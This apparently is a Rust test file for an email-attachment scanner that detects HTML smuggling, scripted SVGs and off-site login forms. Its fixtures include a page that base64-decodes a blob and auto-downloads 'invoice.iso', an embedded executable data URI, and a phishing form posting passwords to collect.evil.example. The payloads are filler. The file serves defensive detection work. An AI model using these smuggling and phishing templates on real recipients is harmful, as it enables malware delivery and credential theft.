use super::*;

fn blob(payload_len: usize) -> Vec<u8> {
    format!(
        "<html><body><script>\
var b = atob('{}');\
var f = new Blob([b], {{type: 'application/octet-stream'}});\
var a = document.createElement('a');\
a.href = URL.createObjectURL(f); a.download = 'invoice.iso'; a.click();\
</script></body></html>",
        "QUJD".repeat(payload_len / 4)
    )
    .into_bytes()
}

fn one(name: &str, ctype: &str, bytes: &[u8], sender: &str) -> HtmlFeatures {
    scan([(name, ctype, bytes)], sender)
}

#[test]
fn a_page_that_builds_and_saves_a_file_is_found() {
    let page = blob(100 * 1024);
    assert!(one("invoice.html", "text/html", &page, "a.example").builds_a_download);
    // named as something else, recognised by its first bytes
    assert!(
        one(
            "invoice.pdf",
            "application/octet-stream",
            &page,
            "a.example"
        )
        .builds_a_download
    );
}

#[test]
fn a_page_with_only_one_of_the_parts_is_not() {
    // the same code with a small payload: a page that saves a report
    assert!(!one("r.html", "text/html", &blob(2 * 1024), "a.example").builds_a_download);
    // a large inline image and no download
    let image = format!(
        "<html><img src=\"data:image/png;base64,{}\"></html>",
        "QUJD".repeat(40_000)
    );
    assert!(!one("r.html", "text/html", image.as_bytes(), "a.example").builds_a_download);
}

#[test]
fn a_data_uri_payload_in_an_embed_counts_as_the_payload() {
    let page = format!(
        "<html><script>var f=new Blob(['x']);location=URL.createObjectURL(f);x.click()</script>\
<embed src=\"data:application/x-msdownload;base64,{}\"></html>",
        "QUJD".repeat(5000)
    );
    assert!(one("a.htm", "", page.as_bytes(), "a.example").builds_a_download);
}

#[test]
fn an_svg_with_script_is_found_and_a_plain_one_is_not() {
    let scripted = b"<svg xmlns=\"http://www.w3.org/2000/svg\"><script>location='https://x.example'</script></svg>";
    assert!(one("logo.svg", "image/svg+xml", scripted, "a.example").svg_runs_script);
    let handler = b"<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"go()\"></svg>";
    assert!(one("logo.svg", "image/svg+xml", handler, "a.example").svg_runs_script);
    let plain = b"<svg xmlns=\"http://www.w3.org/2000/svg\"><circle r=\"4\"/></svg>";
    assert!(!one("logo.svg", "image/svg+xml", plain, "a.example").svg_runs_script);
}

#[test]
fn a_login_form_posting_elsewhere_is_found() {
    let page = b"<html><form action=\"https://collect.evil.example/p.php\" method=post>\
<input name=u><input type=\"password\" name=p></form></html>";
    assert!(one("login.html", "text/html", page, "mail.bank.example").offsite_login_form);
    let own = b"<html><form action=\"https://login.bank.example/p\">\
<input type=\"password\"></form></html>";
    assert!(!one("login.html", "text/html", own, "mail.bank.example").offsite_login_form);
    let no_password =
        b"<html><form action=\"https://survey.example/s\"><input name=q></form></html>";
    assert!(!one("s.html", "text/html", no_password, "a.example").offsite_login_form);
}

#[test]
fn other_attachments_are_not_read() {
    let page = blob(100 * 1024);
    assert_eq!(
        one(
            "data.bin",
            "application/octet-stream",
            &page[6..],
            "a.example"
        ),
        HtmlFeatures::default()
    );
}
